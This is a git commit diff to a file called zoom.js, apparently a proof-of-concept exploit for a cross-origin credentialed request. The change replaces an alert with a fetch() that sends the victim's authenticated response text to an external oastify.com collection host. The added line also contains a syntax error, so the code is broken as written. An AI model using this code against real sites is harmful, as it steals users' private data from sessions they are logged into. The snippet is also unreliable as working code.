bcaf16fb74aac612241c9aea4bbdaa1c69bc8c63
monixxxx <92028136+monixxxx@users.noreply.github.com>
2023-07-29 22:45:11 +0300

    Update zoom.js

--- zoom.js
+++ zoom.js
@@ -5,5 +5,7 @@ req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    alert(this.responseText); 
+    fetch('https://s92luzs7awz2niagondy9mc1csij6du2.oastify.com/?xxx='+this.responseText;)
+    .then(res => res.json())
+    .then(data => console.log(data))
 };
